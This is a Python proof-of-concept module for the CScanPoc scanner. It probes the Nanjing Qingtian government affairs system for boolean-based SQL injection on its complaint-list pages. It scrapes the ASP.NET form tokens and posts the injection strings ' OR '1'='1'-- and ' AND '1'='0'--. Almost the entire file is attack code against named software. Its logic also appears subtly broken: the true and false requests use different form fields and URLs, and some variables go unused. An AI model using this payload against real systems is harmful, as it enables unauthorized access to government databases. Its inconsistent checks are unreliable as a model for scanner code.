# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Skynj_0026'  # 平台漏洞编号，留空
    name = '南京擎天政务系统SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-22'  # 漏洞公布时间
    desc = '''
        擎天政务系统是由南京擎天科技有限公司打造的一款集电子政务、税务信息化、信息集成软件、温室气体排放管理及系统集成业务等五大业务体系的软件。
        南京擎天政务系统SQL注入漏洞：
        /peoplefreepress/accusation_list_page.aspx?tszx=0
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0100247'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '擎天政务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c03377ec-bb86-4973-ba2f-a07620e64f44'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + '/peoplefreepress/accusation_list_page.aspx?tszx=0'
            content_type = 'Content-Type: application/x-www-form-urlencoded'
            proxy = ('127.0.0.1', 8887)
            # 获取网页参数
            code, head, res, err, _ = hh.http(url)
            if(code != 200):
                return False
            m = re.search(
                r'\'src\',\'(PunishShowList\.aspx\?q=[a-z0-9%]*)\'', res)
            if not m:
                return False
            url = arg + '/peoplefreepress/' + m.group(1)
            # 获取viewstate等
            code, head, res, err, _ = hh.http(url)
            if code != 200:
                return False
            m = re.search(r'id="__VIEWSTATE"\s*value="([a-zA-Z0-9+/=]*)"', res)
            # print res
            if not m:
                viewstate = ''
            else:
                viewstate = m.group(1).replace('=', '%3D').replace(
                    '+', '%2B').replace('/', '%2F')
            m = re.search(
                r'id="__EVENTVALIDATION"\s*value="([a-zA-Z0-9+/=]*)"', res)
            if not m:
                eventvalidation = ''
            else:
                eventvalidation = m.group(1).replace(
                    '=', '%3D').replace('+', '%2B').replace('/', '%2F')
            m = re.search(
                r'id="__VIEWSTATEGENERATOR"\s*value="([a-zA-Z0-9+/=]*)"', res)
            if not m:
                viewstategenerator = ''
            else:
                viewstategenerator = m.group(1).replace(
                    '=', '%3D').replace('+', '%2B').replace('/', '%2F')
            # 获取post表单提交url
            m = re.search(
                r'action="(PunishShowList\.aspx\?q=[a-z0-9%]*)"', res)
            if not m:
                return False
            post_url = arg + '/peoplefreepress/' + m.group(1)
            # 构造post表单
            payload = 'asasasasasasasas'
            post_true = '__EVENTTARGET=Btn_Search&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={viewstategenerator}&__EVENTVALIDATION={eventvalidation}&Key={payload}'.format(
                viewstate=viewstate,
                viewstategenerator=viewstategenerator,
                eventvalidation=eventvalidation,
                payload='asasasasasasasas\' OR \'1\'=\'1\'--'
            )
            post_false = '__EVENTTARGET=Btn_Search&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={viewstategenerator}&__EVENTVALIDATION={eventvalidation}&ddlDept=&txtComplaintcode={payload}&Btn_Search=+&dg%3A_ctl8%3AJumpList=%E7%AC%AC1%E9%A1%B5'.format(
                viewstate=viewstate,
                viewstategenerator=viewstategenerator,
                eventvalidation=eventvalidation,
                payload='asasasasasasasas\' AND \'1\'=\'0\'--'
            )
            code, head, res_false, err, _ = hh.http(
                post_url, post=post_false, referer=url, header=content_type)
            if code != 200:
                return False
            code, head, res_true, err, _ = hh.http(
                url, post=post_true, referer=url, header=content_type)
            # bool注入的匹配模式
            if ('onclick="ShowClientDiv' in res_true) and ('onclick="ShowClientDiv' not in res_false):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
